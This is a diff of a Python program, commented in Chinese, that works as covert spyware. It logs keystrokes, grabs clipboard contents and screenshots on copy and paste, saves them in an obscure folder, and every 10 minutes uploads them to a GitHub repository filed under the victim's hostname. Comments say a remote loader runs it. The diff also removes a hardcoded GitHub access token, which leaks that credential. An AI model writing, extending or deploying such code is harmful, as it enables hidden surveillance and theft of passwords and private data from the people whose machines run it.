@@ -8,25 +8,28 @@ from pynput import keyboard
 import pyperclip
 import requests
 
+# 1. 设备与目录初始化
 DEVICE_NAME = socket.gethostname()
 SAVE_DIR = r"D:\AppDataLogs\Cache"
 os.makedirs(SAVE_DIR, exist_ok=True)
 
+# 2. GitHub 基础配置
 GITHUB_CONFIG = {
     "username": "Bei18",
     "repo_name": "my-python-storage",
-    "token": "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",
+    "token": os.getenv("GITHUB_TOKEN", "你的_GITHUB_PAT_TOKEN_放在这里"),
 }
 
 uploaded_files = set()
 
+
 def upload_file_smart(file_path):
+    """按设备名隔离上传文件，若 GitHub 已存在则跳过"""
     if not os.path.exists(file_path):
         return False
 
     file_name = os.path.basename(file_path)
     target_path = f"uploads/{DEVICE_NAME}/{file_name}"
-
     base_url = f"https://api.github.com/repos/{GITHUB_CONFIG['username']}/{GITHUB_CONFIG['repo_name']}/contents/{target_path}"
     headers = {
         "Authorization": f"Bearer {GITHUB_CONFIG['token']}",
@@ -56,7 +59,9 @@ def upload_file_smart(file_path):
     except Exception:
         return False
 
+
 def scheduled_upload_task():
+    """后台定时上传任务（每 10 分钟）"""
     while True:
         time.sleep(600)
         try:
@@ -70,10 +75,12 @@ def scheduled_upload_task():
         except Exception:
             pass
 
+
 def get_log_file_path():
     today_date = time.strftime("%Y-%m-%d")
     log_filename = f"{DEVICE_NAME}-{today_date}-LOG.txt"
     return os.path.join(SAVE_DIR, log_filename)
+
 
 def write_txt(action_type, detail=""):
     timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
@@ -86,6 +93,7 @@ def write_txt(action_type, detail=""):
             f.flush()
     except Exception:
         pass
+
 
 def take_full_screenshot(action_type):
     timestamp = time.strftime("%Y%m%d_%H%M%S")
@@ -104,6 +112,7 @@ def take_full_screenshot(action_type):
         except Exception:
             return None
 
+
 def get_clipboard_content():
     try:
         time.sleep(0.1)
@@ -116,15 +125,18 @@ def get_clipboard_content():
     except Exception:
         return "获取失败"
 
+
 def on_copy():
     img_file = take_full_screenshot("COPY")
     clip_text = get_clipboard_content()
     write_txt("复制(Ctrl+C)", f"截图: {img_file} | {clip_text}")
 
+
 def on_paste():
     img_file = take_full_screenshot("PASTE")
     clip_text = get_clipboard_content()
     write_txt("粘贴(Ctrl+V)", f"截图: {img_file} | {clip_text}")
+
 
 def on_press(key):
     try:
@@ -134,22 +146,39 @@ def on_press(key):
     except Exception:
         pass
 
-# 提供给 Loader 调用的入口方法
-def run():
-    write_txt("启动", "远程代码加载执行中...")
 
+def run():
+    """核心程序入口：解决主线程闪退问题"""
+    write_txt("启动", "远程代码成功加载并运行...")
+
+    # 1. 启动定时上传线程
     upload_thread = threading.Thread(target=scheduled_upload_task, daemon=True)
     upload_thread.start()
 
-    hotkey_listener = keyboard.GlobalHotKeys(
-        {"<ctrl>+c": on_copy, "<ctrl>+v": on_paste}
-    )
-    hotkey_listener.start()
+    # 2. 启动快捷键监听 (Ctrl+C / Ctrl+V)
+    try:
+        hotkey_listener = keyboard.GlobalHotKeys(
+            {"<ctrl>+c": on_copy, "<ctrl>+v": on_paste}
+        )
+        hotkey_listener.start()
+    except Exception as e:
+        write_txt("异常", f"快捷键监听启动失败: {e}")
 
-    with keyboard.Listener(on_press=on_press) as key_listener:
-        key_listener.join()
+    # 3. 启动键盘监听 (Enter)
+    try:
+        key_listener = keyboard.Listener(on_press=on_press)
+        key_listener.start()
+    except Exception as e:
+        write_txt("异常", f"键盘监听启动失败: {e}")
 
-    hotkey_listener.stop()
+    # 4. 关键修正：死循环强行保持主线程存活，防止程序闪退
+    print("[Success] 核心监控服务已成功运行，正在后台轮询中...")
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        write_txt("停止", "手动终止进程")
+
 
 if __name__ == "__main__":
     run()
